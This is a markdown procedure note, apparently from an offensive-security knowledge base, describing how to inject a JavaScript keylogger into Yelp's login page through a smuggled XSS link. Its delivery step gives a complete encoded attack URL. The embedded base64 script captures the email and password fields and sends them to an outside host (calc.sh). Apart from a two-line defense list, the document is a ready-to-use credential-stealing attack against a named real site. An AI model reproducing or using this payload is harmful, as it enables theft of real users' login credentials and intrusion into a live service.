---
tags:
  - keylogger
  - xss-injection
type: procedure
tools:
  - '[[tools/CyberChef]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/javascript-keylogger-payload]]'
  - '[[commands/cyberchef-keylogger-recipe]]'
  - '[[commands/final-keylogger-link]]'
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: f71cdf72-f5a3-45b6-8488-3f84297b3340
created_at: '2025-12-13T23:56:20.373Z'
updated_at: '2025-12-13T23:56:20.373Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject Keylogger Payload via Smuggled XSS

## Summary

This procedure injects a JavaScript keylogger via smuggled XSS to steal login credentials.

## Description

The payload logs email and password inputs on biz.yelp.com/login and exfiltrates to an attacker-controlled domain.

## Requirements

1. Smuggling exploit ready
2. CyberChef for payload encoding
3. Victim interaction

## Defense

Defensive measures and detection strategies:

- Content Security Policy (CSP)
- Monitor network requests for exfiltration

## Objectives

1. Generate encoded payload
2. Set via malicious link
3. Capture credentials

## Instructions

### Step 1: Generate Payload with CyberChef

**Context**: Minify and encode JS.

Use [[commands/cyberchef-keylogger-recipe]] in CyberChef.

> Expected: Encoded URL.

### Step 2: Deliver Malicious Link

**Context**: Victim visits link.

Use [[commands/final-keylogger-link]]:

```bash
https://yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Eeval%28atob%28%27c2V0VGltZW91dCgoZnVuY3Rpb24oKXtmdW5jdGlvbiBlKCl7ZmV0Y2goYGh0dHBzOi8vY2FsYy5zaC8%2FYT0ke2VuY29kZVVSSUNvbXBvbmVudChhLnZhbHVlKX0mYj0ke2VuY29kZVVSSUNvbXBvbmVudChiLnZhbHVlKX1gKX1hPWRvY3VtZW50LmdldEVsZW1lbnRzQnlOYW1lKCJwYXNzd29yZCIpWzBdLGI9ZG9jdW1lbnQuZ2V0RWxlbWVudHNCeU5hbWUoImVtYWlsIilbMF0sYS5mb3JtLm9uY2xpY2s9ZSxhLm9uY2hhbmdlPWUsYi5vbmNoYW5nZT1lLGEub25pbnB1dD1lLGIub25pbnB1dD1lfSksMWUzKTs%3D%27%29%29%2F%2F%3BMax%2DAge%3D99999999
```

> Expected: Keylogger active.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques



## Commands Used

- [[commands/javascript-keylogger-payload]]
- [[commands/cyberchef-keylogger-recipe]]
- [[commands/final-keylogger-link]]

## Tools Used

- [[tools/CyberChef]]

## Tags

- keylogger
- xss-injection
